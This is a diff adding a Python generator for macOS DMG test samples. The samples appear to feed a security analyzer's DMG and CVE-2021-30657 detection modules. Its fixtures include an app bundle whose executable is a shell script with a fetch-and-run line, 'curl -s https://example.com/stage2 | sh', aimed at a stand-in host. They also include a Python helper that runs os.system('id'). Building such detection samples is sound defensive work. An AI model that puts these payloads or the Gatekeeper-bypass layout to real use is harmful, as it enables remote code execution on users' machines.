@@ -1,0 +1,363 @@
+#!/usr/bin/env python3
+"""Writes the samples of PLAN.md 7.5 batch 12's macOS image modules (dmg_analyzer,
+cve_2021_30657_analyzer) into samples/ace4/macos/ and adds them to samples/manifest.json, replacing
+any it added before.
+
+ace3 has no DMG of its own: its tests stand a zip or a 7z archive in for the image dmg2img writes.
+So these are made here, on Linux, in a throwaway image (TOOLS_DOCKERFILE below): HFS+ volumes made
+by mkfs.hfsplus (Apple's newfs_hfs, from Ubuntu 24.04's hfsprogs 540.1.linux3-5build3; Debian
+trixie has none), filled by libdmg-hfsplus' `hfsplus` (commit 7ac55ec6, built without OpenSSL), and
+turned into UDIF disk images two ways: by libdmg-hfsplus' `dmg build`, which writes what hdiutil
+writes for a UDZO image, an Apple partition map with the volume and zlib chunks, and by `udif()`
+below, which writes one partition of the chunk types dmg2img reads (zlib, bzip2, raw, zero fill),
+from a volume or from any bytes. Each DMG is checked with the dmg2img and 7-Zip ace3 has.
+
+- script_app.dmg: an app bundle whose Contents/MacOS/Payload is a shell script (CVE-2021-30657's
+  bypass), with an Info.plist and a file outside the bundle; libdmg-hfsplus.
+- binary_app.dmg: Contents/MacOS/ holds a Mach-O header, which isn't a script, and helper.py,
+  which libmagic calls text/x-script.python; libdmg-hfsplus.
+- linked_app.dmg: Contents/MacOS/Linked is a symlink to ../Resources/start.sh, a script; libdmg-hfsplus.
+- documents.dmg: no app, nested folders, a name with spaces and a hidden file; libdmg-hfsplus.
+- many_members.dmg: 66 scripts in one bundle's Contents/MacOS/, more than a task's 64 tool runs;
+  libdmg-hfsplus.
+- bzip2_app.dmg: script_app's volume, alone (no partition map), in bzip2 chunks; udif().
+- RAW_APP.DMG: binary_app's volume in raw and zero-fill chunks, named in capitals; udif().
+- zip_inside.dmg: one raw chunk holding a zip whose Evil.app/Contents/MacOS/evil is a script, so
+  dmg2img writes a zip, which 7z lists and extracts as it does an HFS+ volume; udif().
+- damaged.dmg: script_app.dmg with 64 bytes of its volume's zlib data flipped, so dmg2img stops
+  with `Inflation failed` and leaves part of the image.
+- not_a_dmg.dmg: text, which dmg2img calls corrupted.
+
+    tools/samples/make-macos-images
+
+Needs Docker. The volumes' dates are when it runs, so a new run makes new bytes; the samples in git
+are one run's. make-macos-hostile imports udif(), patch_parent() and the tools image from here.
+"""
+
+import bz2
+import hashlib
+import json
+import plistlib
+import struct
+import subprocess
+import sys
+import tempfile
+import zipfile
+import zlib
+from pathlib import Path
+
+REPO = Path(__file__).resolve().parent.parent.parent
+SAMPLES = REPO / "samples"
+OUT = SAMPLES / "ace4" / "macos"
+IMAGE = "ace4-macos-tools:latest"
+LIBDMG_COMMIT = "7ac55ec64c96f7800d9818ce64c79670e7f02b67"
+
+TOOLS_DOCKERFILE = f"""\
+FROM ubuntu:24.04 AS hfsprogs
+RUN apt-get update && apt-get install -y --no-install-recommends hfsprogs=540.1.linux3-5build3
+
+FROM debian:13.7-slim
+RUN apt-get update && apt-get install -y --no-install-recommends \\
+        ca-certificates git cmake gcc g++ make zlib1g-dev libbz2-dev python3 file \\
+        dmg2img=1.6.7+git20201227.a3e4134-0.1 7zip=25.01+dfsg-1~deb13u2 \\
+    && rm -rf /var/lib/apt/lists/*
+RUN git clone https://github.com/planetbeing/libdmg-hfsplus.git /opt/libdmg \\
+    && git -C /opt/libdmg checkout {LIBDMG_COMMIT} \\
+    && cmake -S /opt/libdmg -B /opt/libdmg/build -DCMAKE_BUILD_TYPE=Release \\
+    && make -C /opt/libdmg/build dmg-bin hfsplus \\
+    && install /opt/libdmg/build/dmg/dmg /opt/libdmg/build/hfs/hfsplus /usr/local/bin/
+COPY --from=hfsprogs /sbin/mkfs.hfsplus /usr/local/sbin/mkfs.hfsplus
+"""
+
+SECTOR = 512
+BT_ZERO, BT_RAW, BT_ZLIB, BT_BZIP2, BT_COMMENT, BT_TERM = 0, 1, 0x80000005, 0x80000006, 0x7FFFFFFE, 0xFFFFFFFF
+
+
+def tools_image():
+    """Builds the tools image, which needs no build context."""
+    subprocess.run(["docker", "build", "-q", "-t", IMAGE, "-"], input=TOOLS_DOCKERFILE.encode(), check=True,
+                   stdout=subprocess.DEVNULL)
+
+
+def in_tools(work, script):
+    """Runs a shell script in the tools image with `work` at /w, its working directory."""
+    (Path(work) / "make.sh").write_text(script + "\n")
+    subprocess.run(["docker", "run", "--rm", "--network", "none", "-v", f"{work}:/w", "-w", "/w", IMAGE,
+                    "sh", "-e", "make.sh"], check=True, stdout=subprocess.DEVNULL)
+
+
+def volume_script(name, volume, size_mb, entries):
+    """Shell for one HFS+ volume: mkfs.hfsplus, then hfsplus' mkdir, add, chmod and symlink. Each
+    entry is ("dir", path), ("file", path, local name, mode) or ("link", path, target)."""
+    lines = [f"rm -f {name}", f"dd if=/dev/zero of={name} bs=1M count={size_mb} 2>/dev/null",
+             f"mkfs.hfsplus -v '{volume}' {name}"]
+    for entry in entries:
+        if entry[0] == "dir":
+            lines.append(f"hfsplus {name} mkdir '{entry[1]}'")
+        elif entry[0] == "file":
+            lines.append(f"hfsplus {name} add '{entry[2]}' '{entry[1]}'")
+            lines.append(f"hfsplus {name} chmod {entry[3]} '{entry[1]}'")
+        else:
+            lines.append(f"hfsplus {name} symlink '{entry[1]}' '{entry[2]}'")
+    return "\n".join(lines)
+
+
+def mish(chunks, sectors, partition=0):
+    """A blkx table (`mish`) for one partition: each chunk is (type, first sector, sector count,
+    offset in the data fork, length there), then the terminator."""
+    runs = b"".join(struct.pack(">II4Q", kind, 0, first, count, offset, length)
+                    for kind, first, count, offset, length in chunks)
+    runs += struct.pack(">II4Q", BT_TERM, 0, sectors, 0, chunks[-1][3] + chunks[-1][4] if chunks else 0, 0)
+    count = len(chunks) + 1
+    header = struct.pack(">4sIQQQII", b"mish", 1, 0, sectors, 0, 0x800, partition)
+    header += bytes(24) + struct.pack(">II", 2, 32) + bytes(128) + struct.pack(">I", count)
+    assert len(header) == 0xCC
+    return header + runs
+
+
+def plist(tables, names=None):
+    """The resource fork's XML property list, one blkx entry per table, as hdiutil writes it."""
+    entries = []
+    for i, table in enumerate(tables):
+        name = names[i] if names else f"whole disk (Apple_HFS : {i})"
+        entries.append({"Attributes": "0x0050", "CFName": name, "Data": table, "ID": str(i - 1), "Name": name})
+    return plistlib.dumps({"resource-fork": {"blkx": entries}}, fmt=plistlib.FMT_XML)
+
+
+def koly(data_length, xml_offset, xml_length, sectors):
+    """The 512-byte trailer. Its checksums are zero: dmg2img and 7-Zip don't check them."""
+    out = struct.pack(">4sIIIQQQQQII", b"koly", 4, 512, 1, 0, 0, data_length, 0, 0, 1, 1)
+    out += bytes(16) + struct.pack(">II", 2, 32) + bytes(128)
+    out += struct.pack(">QQ", xml_offset, xml_length) + bytes(120)
+    out += struct.pack(">II", 2, 32) + bytes(128) + struct.pack(">IQ", 1, sectors) + bytes(12)
+    assert len(out) == 512, len(out)
+    return out
+
+
+def udif(data, kind="zlib", chunk_sectors=2048, pad=True):
+    """A UDIF disk image of `data` as one partition, in chunks of `chunk_sectors` sectors: `zlib`,
+    `bzip2`, or `raw` with runs of zeros as zero-fill chunks. The data is padded to a whole sector,
+    unless `pad` is false, when dmg2img writes a last raw chunk as it is."""
+    sectors = -(-len(data) // SECTOR)
+    if pad:
+        data = data + bytes(-len(data) % SECTOR)
+    fork = bytearray()
+    chunks = []
+    for first in range(0, sectors, chunk_sectors):
+        piece = data[first * SECTOR:(first + chunk_sectors) * SECTOR]
+        count = -(-len(piece) // SECTOR)
+        if kind == "raw" and not any(piece):
+            chunks.append((BT_ZERO, first, count, len(fork), 0))
+            continue
+        packed = {"zlib": lambda b: zlib.compress(b, 9), "bzip2": lambda b: bz2.compress(b, 9),
+                  "raw": lambda b: b}[kind](piece)
+        chunks.append(({"zlib": BT_ZLIB, "bzip2": BT_BZIP2, "raw": BT_RAW}[kind], first, count, len(fork),
+                       len(packed)))
+        fork += packed
+    return assemble(bytes(fork), [mish(chunks, sectors)], sectors)
+
+
+def assemble(fork, tables, sectors, names=None):
+    """The data fork, the property list of these tables and the trailer."""
+    xml = plist(tables, names)
+    return fork + xml + koly(len(fork), len(fork), len(xml), sectors)
+
+
+def catalog_records(image, start, length):
+    """Every leaf record of the HFS+ catalog B-tree in the volume at `image[start:start+length]`, as
+    (offset of its key in `image`, parent ID, name, record type, CNID)."""
+    header = image[start + 1024:start + 1024 + 512]
+    assert header[:2] == b"H+", header[:2]
+    block_size = struct.unpack(">I", header[40:44])[0]
+    # catalogFile's fork data is at 0x110: its first extent's start block and count at 0x120
+    first_block, blocks = struct.unpack(">II", header[0x120:0x128])
+    catalog = start + first_block * block_size
+    node_size = struct.unpack(">H", image[catalog + 14 + 18:catalog + 14 + 20])[0]
+    nodes = blocks * block_size // node_size
+    records = []
+    for n in range(1, nodes):
+        node = catalog + n * node_size
+        kind = struct.unpack(">b", image[node + 8:node + 9])[0]
+        count = struct.unpack(">H", image[node + 10:node + 12])[0]
+        if kind != -1:
+            continue
+        for i in range(count):
+            offset = struct.unpack(">H", image[node + node_size - 2 * (i + 1):node + node_size - 2 * i])[0]
+            key = node + offset
+            key_length, parent, name_length = struct.unpack(">HIH", image[key:key + 8])
+            name = image[key + 8:key + 8 + 2 * name_length].decode("utf-16-be")
+            record = key + 2 + key_length
+            record_type = struct.unpack(">H", image[record:record + 2])[0]
+            cnid = struct.unpack(">I", image[record + 8:record + 12])[0] if record_type in (1, 2) else None
+            records.append((key, parent, name, record_type, cnid))
+    return records
+
+
+def patch_parent(image, start, length, name, parent):
+    """Moves the folder or file `name` under the folder whose CNID is `parent`, by its catalog key
+    alone: 7-Zip builds paths from the keys' parent IDs, and walks the leaf nodes in order, so the
+    key's place in the tree doesn't matter to it. Returns the item's CNID."""
+    for key, _, record_name, record_type, cnid in catalog_records(image, start, length):
+        if record_name == name and record_type in (1, 2):
+            image[key + 2:key + 6] = struct.pack(">I", parent)
+            return cnid
+    raise SystemExit(f"no catalog record named {name}")
+
+
+def cnid_of(image, start, length, name):
+    for _, _, record_name, record_type, cnid in catalog_records(image, start, length):
+        if record_name == name and record_type in (1, 2):
+            return cnid
+    raise SystemExit(f"no catalog record named {name}")
+
+
+def check(work, names):
+    """dmg2img and 7z on each DMG, as ace3 runs them, so a sample that doesn't read is caught here."""
+    script = []
+    for name in names:
+        script.append(f"echo '== {name}'; dmg2img '{name}' 'check.img' >/dev/null 2>&1 || true; "
+                      f"if [ -f check.img ]; then 7z l check.img | sed -n '/^-------------------/,$p'; fi; "
+                      f"rm -f check.img")
+    result = subprocess.run(["docker", "run", "--rm", "--network", "none", "-v", f"{work}:/w", "-w", "/w", IMAGE,
+                             "sh", "-c", "\n".join(script)], check=True, capture_output=True, text=True)
+    return result.stdout
+
+
+def entry(path, kinds, source, note=None):
+    data = path.read_bytes()
+    relative = path.relative_to(SAMPLES).as_posix()
+    record = {
+        "path": relative,
+        "sha256": hashlib.sha256(data).hexdigest(),
+        "size": len(data),
+        "kinds": kinds,
+        "source": source,
+        "in_git": True,
+        "alert_path": path.name,
+        "meta_tags": ["type=email.attachment"],
+    }
+    if note:
+        record["note"] = note
+    return record
+
+
+SCRIPT = b"#!/bin/bash\n# runs in place of the app's binary\nopen -a Terminal\ncurl -s https://example.com/stage2 | sh\n"
+INFO_PLIST = plistlib.dumps({"CFBundleExecutable": "Payload", "CFBundleIdentifier": "com.example.payload",
+                             "CFBundlePackageType": "APPL"})
+# a 64-bit arm64 Mach-O executable's header with no load commands, padded
+MACHO = struct.pack("<IiiIIII", 0xFEEDFACF, 0x0100000C, 0, 2, 0, 0, 0) + bytes(4064)
+PYTHON = b"#!/usr/bin/env python3\nimport os\nos.system('id')\n"
+
+
+def main():
+    tools_image()
+    OUT.mkdir(parents=True, exist_ok=True)
+    how = "made by tools/samples/make-macos-images"
+    samples = []
+    with tempfile.TemporaryDirectory() as tmp:
+        work = Path(tmp)
+        (work / "payload.sh").write_bytes(SCRIPT)
+        (work / "Info.plist").write_bytes(INFO_PLIST)
+        (work / "readme.txt").write_bytes(b"Double-click Payload to install.\n")
+        (work / "tool").write_bytes(MACHO)
+        (work / "helper.py").write_bytes(PYTHON)
+        (work / "notes.txt").write_bytes(b"meeting notes\n")
+        for i in range(66):
+            (work / f"part{i:02}.sh").write_bytes(b"#!/bin/sh\necho part %d\n" % i)
+        app = "/Payload.app/Contents"
+        volumes = {
+            "script_app.vol": ("Installer", 4, [
+                ("dir", "/Payload.app"), ("dir", app), ("dir", f"{app}/MacOS"), ("dir", f"{app}/Resources"),
+                ("file", f"{app}/Info.plist", "Info.plist", "644"),
+                ("file", f"{app}/MacOS/Payload", "payload.sh", "755"),
+                ("file", f"{app}/Resources/readme.txt", "readme.txt", "644"),
+                ("file", "/Read Me.txt", "readme.txt", "644"),
+            ]),
+            "binary_app.vol": ("Tool", 4, [
+                ("dir", "/Tool.app"), ("dir", "/Tool.app/Contents"), ("dir", "/Tool.app/Contents/MacOS"),
+                ("file", "/Tool.app/Contents/Info.plist", "Info.plist", "644"),
+                ("file", "/Tool.app/Contents/MacOS/Tool", "tool", "755"),
+                ("file", "/Tool.app/Contents/MacOS/helper.py", "helper.py", "755"),
+            ]),
+            "linked_app.vol": ("Linked", 4, [
+                ("dir", "/Linked.app"), ("dir", "/Linked.app/Contents"), ("dir", "/Linked.app/Contents/MacOS"),
+                ("dir", "/Linked.app/Contents/Resources"),
+                ("file", "/Linked.app/Contents/Resources/start.sh", "payload.sh", "755"),
+                ("link", "/Linked.app/Contents/MacOS/Linked", "../Resources/start.sh"),
+            ]),
+            "documents.vol": ("Documents", 4, [
+                ("dir", "/Reports"), ("dir", "/Reports/2026"), ("dir", "/Reports/2026/Q1"),
+                ("file", "/Reports/2026/Q1/summary.txt", "notes.txt", "644"),
+                ("file", "/My Notes.txt", "notes.txt", "644"),
+                ("file", "/.hidden", "notes.txt", "600"),
+            ]),
+            "many_members.vol": ("Many", 4, [
+                ("dir", "/Many.app"), ("dir", "/Many.app/Contents"), ("dir", "/Many.app/Contents/MacOS"),
+            ] + [("file", f"/Many.app/Contents/MacOS/part{i:02}", f"part{i:02}.sh", "755") for i in range(66)]),
+        }
+        script = []
+        for name, (volume, size, entries) in volumes.items():
+            script.append(volume_script(name, volume, size, entries))
+            script.append(f"dmg build {name} {name[:-4]}.dmg >/dev/null")
+        in_tools(work, "\n".join(script))
+
+        for name, kinds, note in [
+            ("script_app.dmg", ["macos/dmg", "macos/cve-2021-30657"], "Contents/MacOS/Payload is a shell script"),
+            ("binary_app.dmg", ["macos/dmg", "macos/cve-2021-30657"], "a Mach-O and a Python script in Contents/MacOS"),
+            ("linked_app.dmg", ["macos/dmg"], "Contents/MacOS/Linked is a symlink to a script"),
+            ("documents.dmg", ["macos/dmg"], "no app bundle"),
+            ("many_members.dmg", ["macos/dmg", "macos/cve-2021-30657"], "66 scripts in Contents/MacOS"),
+        ]:
+            target = OUT / name
+            target.write_bytes((work / name).read_bytes())
+            samples.append(entry(target, kinds, f"{how}: mkfs.hfsplus, libdmg-hfsplus' hfsplus and dmg build", note))
+
+        app_kinds = ["macos/dmg", "macos/cve-2021-30657"]
+        made = {
+            "bzip2_app.dmg": (udif((work / "script_app.vol").read_bytes(), "bzip2"), app_kinds,
+                              "script_app's volume alone, in bzip2 chunks"),
+            "RAW_APP.DMG": (udif((work / "binary_app.vol").read_bytes(), "raw", 8), app_kinds,
+                            "binary_app's volume in raw and zero-fill chunks, named in capitals"),
+        }
+        with tempfile.SpooledTemporaryFile() as buffer:
+            with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
+                for member, data in [("Evil.app/Contents/Info.plist", INFO_PLIST),
+                                     ("Evil.app/Contents/MacOS/evil", SCRIPT)]:
+                    info = zipfile.ZipInfo(member, date_time=(2026, 11, 10, 12, 0, 0))
+                    info.external_attr = 0o755 << 16
+                    archive.writestr(info, data, zipfile.ZIP_DEFLATED)
+            buffer.seek(0)
+            made["zip_inside.dmg"] = (udif(buffer.read(), "raw"), app_kinds,
+                                      "one raw chunk holding a zip with a script in Evil.app")
+        damaged = bytearray((work / "script_app.dmg").read_bytes())
+        # the largest zlib chunk, the one holding the volume's catalog: flip the 64 bytes after its
+        # zlib header, its first deflate block's header among them
+        xml_offset, xml_length = struct.unpack(">QQ", damaged[-512 + 0xD8:-512 + 0xE8])
+        tables = plistlib.loads(bytes(damaged[xml_offset:xml_offset + xml_length]))["resource-fork"]["blkx"]
+        runs = [struct.unpack(">II4Q", t["Data"][0xCC + 40 * i:0xCC + 40 * (i + 1)])
+                for t in tables for i in range(struct.unpack(">I", t["Data"][0xC8:0xCC])[0])]
+        largest = max((r for r in runs if r[0] == BT_ZLIB), key=lambda r: r[5])
+        for i in range(largest[4] + 2, largest[4] + 66):
+            damaged[i] ^= 0xFF
+        made["damaged.dmg"] = (bytes(damaged), ["macos/dmg"], "script_app.dmg with 64 bytes of its catalog's zlib data flipped")
+        made["not_a_dmg.dmg"] = (b"this is not a disk image\n", ["macos/dmg"], "text named .dmg")
+        for name, (data, kinds, note) in made.items():
+            (work / name).write_bytes(data)
+            (OUT / name).write_bytes(data)
+            source = f"{how}: udif()" if name in ("bzip2_app.dmg", "RAW_APP.DMG", "zip_inside.dmg") else how
+            samples.append(entry(OUT / name, kinds, source, note))
+        print(check(work, [s["path"].rsplit("/", 1)[1] for s in samples]))
+
+    manifest_path = SAMPLES / "manifest.json"
+    manifest = json.loads(manifest_path.read_text())
+    paths = {sample["path"] for sample in samples}
+    kept = [s for s in manifest["samples"] if s["path"] not in paths]
+    manifest["samples"] = sorted(kept + samples, key=lambda sample: sample["path"])
+    manifest_path.write_text(json.dumps(manifest, indent=2) + "\n")
+    for sample in samples:
+        print(f"{sample['path']}: {sample['size']} bytes")
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
